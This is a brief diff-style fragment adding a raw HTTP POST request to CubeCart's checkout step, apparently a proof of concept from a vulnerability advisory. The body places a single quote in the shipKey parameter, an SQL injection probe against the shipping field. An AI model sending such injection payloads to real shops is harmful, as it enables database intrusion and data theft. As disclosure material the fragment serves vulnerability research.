@@ -1,0 +1,7 @@
+POST /CubeCart/index.php?_g=co&_a=step2 HTTP/1.1
+Cookie: [...]
+Content-Type: application/x-www-form-urlencoded
+[...]
+
+quan%5B3afcdbfeb6ecfbdd0ba628696e3cc163%5D=3&shipKey=1'&coupon=
+
